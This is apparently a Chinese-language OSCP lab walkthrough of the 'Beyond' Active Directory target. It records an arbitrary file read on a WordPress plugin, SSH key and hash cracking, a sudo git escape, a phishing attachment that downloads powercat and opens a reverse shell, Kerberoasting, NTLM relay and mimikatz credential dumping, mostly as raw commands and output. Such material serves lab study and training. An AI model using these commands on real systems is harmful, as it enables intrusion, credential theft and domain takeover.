# Beyond 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OSCP Lab (Beyond.com AD 域環境)
> - **主機群與作業系統**：
>   - Webserver (192.168.224.244) - Linux Ubuntu
>   - Mailserver (192.168.224.242 / 172.16.180.254) - Windows Server 2022
>   - ClientWK1 (172.16.180.243) - Windows 11
>   - InternalSRV1 (172.16.180.241) - Windows Server 2022
>   - DCSrv1 (172.16.180.240) - Windows Server 2022
> - **開始時間**：2026-07-15

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (Nmap)

#### Mailserver (192.168.224.242) 外網掃描
使用 nmap 探測該主機開放的連接埠：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond/mailsrv1]
└─$ nmap -Pn -sVC -oN mailsrv1 192.168.224.242
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-14 23:44 -0400
Nmap scan report for 192.168.224.242
Host is up (0.084s% latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: SORT CAPABILITY NAMESPACE QUOTA OK completed IMAP4 RIGHTS=texkA0001 ACL IDLE IMAP4rev1 CHILDREN
445/tcp  open  microsoft-ds?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-15T03:44:35
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.44 seconds
```

對 80 連接埠執行目錄列舉：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond/mailsrv1]
└─$ dirsearch -u http://192.168.224.242 -i 200 

Target: http://192.168.224.242/
Task Completed  
```
未發現有用路徑。

#### Webserver (192.168.224.244) 外網掃描
使用 nmap 探測該主機開放的連接埠：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ nmap -Pn -sVC -oN mailsrv1 192.168.224.244
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-14 23:45 -0400
Nmap scan report for 192.168.224.244
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: WordPress 6.0.2
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: BEYOND Finances &#8211; We provide financial freedom
|_Requested resource was http://192.168.224.244/main/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.01 seconds
```

使用 `whatweb` 確認 Web 服務資訊：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ whatweb http://192.168.224.244
http://192.168.224.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.224.244], RedirectLocation[http://192.168.224.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.224.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.224.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
```

使用 `wpscan` 對該 WordPress 網站進行插件掃描：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ wpscan --url http://192.168.224.244 --enumerate p --plugins-detection aggressive -o wpscan 

┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ cat wpscan 
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                        Version 3.8.28
_______________________________________________________________

[+] duplicator
 | Location: http://192.168.224.244/wp-content/plugins/duplicator/
 | Last Updated: 2026-05-22T21:05:00.000Z
 | Readme: http://192.168.224.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.16.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.224.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.224.244/wp-content/plugins/duplicator/readme.txt
```
掃描發現啟用了舊版本的 `duplicator` (1.3.26) 插件。

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ Webserver (192.168.224.244) 突破

#### 漏洞分析
使用 `searchsploit` 搜尋該插件漏洞，發現存在未授權的任意檔案讀取漏洞 (CVE-2020-11738)：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ searchsploit duplicator 1.3.26
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read                | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)   | php/webapps/49288.rb
WordPress Plugin Duplicator &lt; 1.5.7.1 - Unauthenticated Sensitive Data Exposure to Acco | php/webapps/51874.py
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ searchsploit -m 50420         
  Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50420
     Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
    Codes: CVE-2020-11738
 Copied to: /home/kali/Desktop/Beyond/websrv1/50420.py
```

#### 漏洞利用：讀取系統檔案與使用者列舉
使用下載下來的 Python POC 來讀取目標系統的 `/etc/passwd` 檔案：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ python3 50420.py http://192.168.224.244 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```
發現兩個普通使用者：`daniela`、`marcus`。

#### 漏洞利用：獲取與破解 SSH 私鑰
嘗試讀取使用者的 SSH 私鑰檔案：
```bash
# 嘗試讀取 marcus 的 id_rsa (失敗)
┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ python3 50420.py http://192.168.224.244 /home/marcus/.ssh/id_rsa
Invalid installer file name!!

# 嘗試讀取 daniela 的 id_rsa (成功)
┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ python3 50420.py http://192.168.224.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
...
28gwmsB90EKrpUtt4YmtMkgz+dy8oHvDQlVys4qRbzE4/Dm8N2djaImiHY9ylSzbFPv3Nk
GiIQPzrimq9qfW3qAPjSmkcSUiNAIwyVJA+o9/RrZ9POVCcHp23/VlfwwpOlhDUSCVTmHk
...
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----

┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ python3 50420.py http://192.168.224.244 /home/daniela/.ssh/id_rsa > daniela_id_rsa
```

由於此私鑰設定了 Passphrase 保護，我們必須先將其破解。
使用 `ssh2john` 將私鑰轉換為 Hash，並使用 `john` 配合 `rockyou.txt` 字典進行破解：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ ssh2john daniela_id_rsa > daniela.hash                       

┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ john daniela.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (daniela_id_rsa)     
1g 0:00:03:33 DONE (2026-06-15 00:30) 0.004682g/s 6.592p/s 6.592c/s 6.592C/s jesse..tagged
Session completed. 

┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ echo 'daniela:tequieromucho' > ../creds.txt 
```
成功破解出密碼為：**`tequieromucho`**。

#### 取得 SSH 存取權限
使用私鑰與密碼登入 `192.168.224.244`，成功取得使用者 `daniela` 的 Shell：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ chmod 600 ./daniela_id_rsa 

┌──(kali㉿kali)-[~/Desktop/Beyond/websrv1]
└─$ ssh -i daniela_id_rsa daniela@192.168.224.244
Enter passphrase for key 'daniela_id_rsa': tequieromucho
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)

daniela@websrv1:~$ whoami
daniela
```

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ Webserver 本地資訊收集 (Local Enumeration)
上傳 `linpeas` 腳本對系統進行本地安全性審計：
```bash
# 檢查 sudo 權限
Matching Defaults entries for daniela on websrv1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
```
發現 `daniela` 可以免密碼以任意使用者（包括 root）執行 `/usr/bin/git`。

同時檢查 Wordpress 設定檔 `wp-config.php`，發現資料庫明文密碼：
```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
```
- 資料庫帳密：**`wordpress:DanielKeyboard3311`**

進一步在 `/srv/www/wordpress` 目錄中發現屬於 root 的 `.git` 目錄：
```bash
drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git
```

### 🔑 檢查 Git Log 還原敏感憑證
因為我們可以利用 `sudo git`，我們可以直接查看該專案的 git 提交歷史以尋找被刪除的敏感資訊：
```bash
daniela@websrv1:/srv/www/wordpress$ sudo git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit
```

查看最新的 commit `612ff5783cc5dbd1e0e008523dba83374a84aaf1` 中刪除了什麼內容：
```bash
daniela@websrv1:/srv/www/wordpress$ sudo git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
-
```
在被刪除的腳本中，發現了 staging server 的 sshpass 連線憑證：
- 憑證：**`john:dqsTwTpZPn#nL`**

### 👑 Sudo Git Pager 提權至 Root
利用 `sudo git` 在執行時會調用分頁器的特性進行逃逸：
```bash
daniela@websrv1:/srv/www/wordpress$ sudo git branch --help config
```
當終端機呈現 `less` 分頁器狀態時，輸入（類似 `vim` 的 `:wq` 操作方式）：
```text
!/bin/bash
```
按下 Enter 後，即可成功取得 Root Shell：
```bash
# whoami
root
```

---

## 🔒 4. 內網橫向移動 (Lateral Movement & Pivot)

### 📧 Mailserver (192.168.224.242) 的釣魚郵件初始存取

#### 憑證檢驗
整理目前取得的 3 組帳密憑證並寫入本地文字檔：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ cat creds.txt                     
daniela:tequieromucho
wordpress:DanielKeyboard3311
john:dqsTwTpZPn#nL

┌──(kali㉿kali)-[~/Desktop/Beyond] 
└─$ cat users.txt 
daniela 
wordpress 
john 

┌──(kali㉿kali)-[~/Desktop/Beyond] 
└─$ cat passwords.txt 
tequieromucho 
DanielKeyboard3311 
dqsTwTpZPn#nL
```

使用 `nxc smb` 工具對外網的 `Mailserver (192.168.224.242)` 進行憑證噴灑（Credential Spraying）：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ nxc smb 192.168.224.242 -u users.txt -p passwords.txt --continue-on-success
SMB         192.168.224.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:None)
SMB         192.168.224.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
```
確認 **`john:dqsTwTpZPn#nL`** 為有效的 Windows 域帳號。

使用該帳號列舉 SMB 共用路徑：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ nxc smb 192.168.224.242 -u john -p 'dqsTwTpZPn#nL' --shares    
SMB         192.168.224.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.224.242 445    MAILSRV1         [*] Enumerated shares
SMB         192.168.224.242 445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.224.242 445    MAILSRV1         -----           -----------     ------
SMB         192.168.224.242 445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.224.242 445    MAILSRV1         C$                              Default share
SMB         192.168.224.242 445    MAILSRV1         IPC$            READ            Remote IPC
```
只有對 `IPC$` 的唯讀權限，無法直接透過 WinRM 或 PsExec 連線。

#### 建立釣魚惡意檔案
我們必須利用 Mail 服務對內網員工進行釣魚以獲取初始 Windows 權限。

1. **在 Kali 上架設一個匿名 WebDAV 服務**：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/Beyond]
   └─$ mkdir webdav && cd webdav 

   ┌──(kali㉿kali)-[~/Desktop/Beyond/webdav]
   └─$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Desktop/Beyond/webdav
   Running without configuration file.

   ...........

   01:33:38.850 - INFO    : Serving on http://0.0.0.0:80 ...
   ```
2. **在 WebDAV 目錄中準備惡意快捷方式 `runme.lnk`**：
   該快捷方式執行的指令為：
   ```powershell
   powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.243:888/powercat.ps1');powercat -c 192.168.45.243 -p 4444 -e powershell"
   ```
3. **準備 `openme.library-ms` 檔案以載入該 WebDAV 服務**：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/Beyond]
   └─$ cat openme.library-ms 
   <?xml version="1.0" encoding="UTF-8"?>
   <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
       <name>@windows.storage.dll,-34582</name>
       <version>6</version>
       <isLibraryPinned>true</isLibraryPinned>
       <iconReference>imageres.dll,-1003</iconReference>
       <templateInfo>
           <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
       </templateInfo>
       <searchConnectorDescriptionList>
           <searchConnectorDescription>
               <isDefaultSaveLocation>true</isDefaultSaveLocation>
               <isSupported>false</isSupported>
               <simpleLocation>
                   <url>http://192.168.45.243</url>
               </simpleLocation>
           </searchConnectorDescription>
       </searchConnectorDescriptionList>
   </libraryDescription>
   ```

#### 傳送郵件與反彈 Shell
使用已知的有效郵件憑證 `john` 來發送電子郵件至內部人員（如 `daniela`、`marcus`），郵件附件為剛才建立的 `openme.library-ms` 檔案：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ sendEmail -t daniela@beyond.com marcus@beyond.com -u 123 -s 192.168.224.242 -a openme.library-ms -f john@beyond.com -v -m 123 -xu john@beyond.com -xp 'dqsTwTpZPn#nL'
Jun 15 02:09:04 kali sendEmail[99601]: Email was sent successfully!  From: <john@beyond.com> To: <daniela@beyond.com> <marcus@beyond.com> Subject: [123] Attachment(s): [openme.library-ms] Server: [192.168.224.242:25]
```

在 Kali 上開啟 `powercat.ps1` 託管與 NC 監聽：
```bash
# 執行 NC 監聽
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.224.242] 63378
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
beyond\marcus
```
成功取得使用者 **`beyond\marcus`** 的 Reverse Shell，進入內網工作站主機。

---

## 🌐 5. 內網域環境資訊收集 (Domain Enumeration)

### 🕵️ ClientWK1 (172.16.180.243) 資訊整理
檢查主機的基礎設定資訊：
```powershell
PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
CLIENTWK1
PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig

Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : 172.16.180.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.180.254
```
此工作站有第二張網卡，連接內網網域 `172.16.180.0/24`。

上傳並執行 `winpeas`，在 DNS 快取記錄中發現其他重要主機的 IP：
```text
╔══════════╣ DNS cached --limit 70-- (T1016)
    Entry                                 Name                                  Data
    dcsrv1.beyond.com                     DCSRV1.beyond.com                     172.16.180.240
    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.180.254
```
- 網域控制器 (DC)：**`172.16.180.240` (DCSRV1)**
- 內網郵件伺服器：**`172.16.180.254` (MAILSRV1)**

### 🐕 BloodHound 域環境分析
上傳 `SharpHound.ps1` 進行域資訊收集，並將產生的壓縮檔下載回 Kali：
```powershell
PS C:\users\Public> Import-Module .\Sharphound.ps1
PS C:\users\Public> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\users\Public -OutputPrefix "CLIENTWK1"
# 產生成果：CLIENTWK1_20260614234306_BloodHound.zip
```

在 BloodHound 中載入該資料庫進行分析，發現重要成果：
1. **主機與使用者數量**：網域中共存在 4 台主機與 8 個使用者。
   ![image](image/B1cZXmT-Me.png)
   ![image](image/HyV4XQT-fg.png)
2. **Domain Admin**：使用者 `beccy` 屬於 **Domain Admins** 群組。
   ![image](image/Hyz6mXTZGl.png)
3. **Session 資訊**：`beccy` 在 `MAILSRV1` 上有一個活躍的登入 Session。
   ![image](image/rJVWSQ6WGg.png)
4. **Kerberoasting 可能性**：使用者 `daniela` 設定了 SPN，為可受 Kerberoasting 攻擊的帳號。
   ![image](image/rk6fI76-Gg.png)

### 🌉 內網代理架設 (Ligolo-NG)
為了存取內網 `172.16.180.0/24` 的服務，在 CLIENTWK1 上架設 Ligolo 代理：
```powershell
# 目標端執行 agent
PS C:\users\Public> .\agent.exe -connect 192.168.45.243:11601 -ignore-cert
```
```bash
# 攻擊機 Kali 啟動 proxy 服務並建立網卡路由
┌──(kali㉿kali)-[~/Desktop/ligolo/proxy]
└─$ sudo ./proxy -selfcert     
ligolo-ng » INFO[0045] Agent joined.                                 id=005056abb176 name="BEYOND\\marcus@CLIENTWK1" remote="192.168.224.242:63545"
ligolo-ng » session
? Specify a session : 1 - BEYOND\marcus@CLIENTWK1 - 192.168.224.242:63545 - 005056abb176
[Agent : BEYOND\marcus@CLIENTWK1] » start

┌──(kali㉿kali)-[~/Desktop/ligolo/proxy]
└─$ sudo ip tuntap add dev ligolo mode tun      
┌──(kali㉿kali)-[~/Desktop/ligolo/proxy]
└─$ sudo ip link set ligolo up            
┌──(kali㉿kali)-[~/Desktop/ligolo/proxy]
└─$ sudo ip route add 172.16.180.0/24 dev ligolo
```

使用 `nmap` 掃描檢測內網各主機的開放埠口：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ nmap -Pn -sV -iL 172.16.x.0 --open
...
Nmap scan report for 172.16.180.240 (DCSRV1)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Nmap scan report for 172.16.180.241 (INTERNALSRV1)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
135/tcp  open  msrpc         Microsoft Windows RPC
443/tcp  open  ssl/http      Apache httpd 2.4.53
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.23 or earlier (unauthorized)

Nmap scan report for 172.16.180.254 (MAILSRV1)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
80/tcp   open  http          Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```
發現 `INTERNALSRV1` (172.16.180.241) 開啟了 HTTP (80/443) 網頁服務。

---

## 💥 6. 內網滲透突破 (Internal Exploitation)

### 🌐 訪問 InternalSRV1 (172.16.180.241)

當瀏覽該 HTTP 網站時，會被重新導向至 `internalsrv1.beyond.com`。
編輯 Kali 的 `/etc/hosts`，寫入該域名解析：
```text
172.16.180.241   internalsrv1.beyond.com
```
訪問後台為一個 WordPress 網站。

### 🔑 進行 Kerberoasting 攻擊
由於 `daniela` 可受 Kerberoasting，我們可以使用 `john` 的憑證，向網域伺服器請求其 SPN 的 Ticket：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ impacket-GetUserSPNs -dc-ip 172.16.180.240 -request -outputfile daniela.kerberoast beyond.com/john:dqsTwTpZPn#nL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  -------  --------  --------------------------  --------------------------  ----------
http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             

┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ impacket-GetUserSPNs -dc-ip 172.16.180.240 -request -outputfile daniela.kerberoast beyond.com/john:dqsTwTpZPn#nL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  -------  --------  --------------------------  --------------------------  ----------
http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             



[-] CCache file is not found. Skipping...
```

取得 TGS 票據後，利用 `hashcat` 進行破解：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ hashcat -m 13100 daniela.kerberoast /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting
...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*........:DANIelaRO123
```
成功解出 `daniela` 帳密：**`daniela:DANIelaRO123`**。

使用該憑證成功登入 `http://internalsrv1.beyond.com/wp-admin` 後台：
![image](image/Hkf8zETZGl.png)

在後台的插件管理介面中，發現啟用了外掛：**`Backup Migration`**。
![image](image/rJMxBVTWfl.png)

---

## 💥 7. 內網 NTLM 中間人攻擊 (NTLM Relay)

### 偵測 SMB 簽名設定
使用 `nxc smb` 列舉內網主機的 SMB 簽名是否為強制（Required）：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ nxc smb 172.16.x.0                                    
SMB         172.16.180.243  445    CLIENTWK1        [*] Windows 11 Build 22000 x64 (name:CLIENTWK1) (domain:beyond.com) (signing:False) (SMBv1:None)
SMB         172.16.180.241  445    INTERNALSRV1     [*] Windows Server 2022 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:None)
SMB         172.16.180.240  445    DCSRV1           [*] Windows Server 2022 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.180.254  445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:None)
```
偵測結果發現：**`MAILSRV1 (172.16.180.254)`** 及 **`INTERNALSRV1 (172.16.180.241)`** 皆沒有強制啟用 SMB 簽名 (`signing:False`)。
這代表我們可以使用 **NTLM Relay** 攻擊。

我們將把來自 `INTERNALSRV1` 的連線認證，Relay 轉發至 `MAILSRV1`。

### 啟動轉發監聽與設定 Web 路徑
在 Kali 攻擊機端，啟動 `impacket-ntlmrelayx`，Relay 目標設為 `172.16.180.254`（MAILSRV1），並在成功時執行反彈 Shell：
```bash
# 準備 PowerShell 反彈 Shell 的 Base64 指令並啟動 ntlmrelayx
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.180.254 -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAG........"
[*] Servers started, waiting for connections
```

進入 `Backup Migration` 管理介面，其備份目錄通常為本機路徑。我們將其修改為 Kali 的 SMB 路徑（`//192.168.45.243/xxxx`）：
![image](image/Bk_GBNp-Gg.png)
![image](image/HJOj9NpZfe.png)

點擊保存或觸發備份，該 Windows 伺服器會以 WordPress 的執行權限（假設為高權限）向攻擊機 Kali 的 SMB 服務進行驗證。
Kali 收到驗證後，立即將其 Relay 至 `MAILSRV1` 並執行反彈指令。

### 成功取得 MAILSRV1 SYSTEM 權限 Shell
在 Kali 的 NC 監聽埠中成功接回 Shell：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ rlwrap nc -lvnp 4455
listening on [any] 4455 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.224.242] 54221

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> ipconfig

Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : 192.168.224.242

Ethernet adapter Ethernet1:
   IPv4 Address. . . . . . . . . . . : 172.16.180.254
```
我們成功以 **`nt authority\system`** 最高管理權限進入了 `MAILSRV1` (172.16.180.254)。

---

## 📈 8. Active Directory 域控制器突破 (DC Compromise)

### 🕵️ 憑證轉儲 (Credentials Dumping)
既然在 `MAILSRV1` 上擁有了 SYSTEM 權限，且先前 BloodHound 顯示 Domain Admin `beccy` 在此主機上有 Session，我們可以使用 `mimikatz` 將記憶體中的憑證導出：
```powershell
PS C:\users\public> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
mimikatz(commandline) # privilege::debug
Privilege '20' OK
mimikatz(commandline) # sekurlsa::logonpasswords

         * Username : Administrator
         * Domain   : MAILSRV1
         * NTLM     : 76821e8eeb84c0ec6446dbcc40ee2c99

         * Username : beccy
         * Domain   : BEYOND
         * NTLM     : f0397ec5af49971f6efbdb07877046b3
```
導出結果取得：
- 本機 `Administrator` 的 NTLM Hash：**`76821e8eeb84c0ec6446dbcc40ee2c99`**
- 域管理員 `beccy` 的 NTLM Hash：**`f0397ec5af49971f6efbdb07877046b3`**

### 🔑 憑證橫向重用驗證
利用 `nxc` 測試轉儲的本機管理員 Hash，確認該密碼是否在內網中被通用：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ nxc smb 172.16.x.0 -u Administrator -H 76821e8eeb84c0ec6446dbcc40ee2c99 --local-auth --continue-on-success
SMB         172.16.180.254  445    MAILSRV1         [+] MAILSRV1\Administrator:76821e8eeb84c0ec6446dbcc40ee2c99 (Pwn3d!)
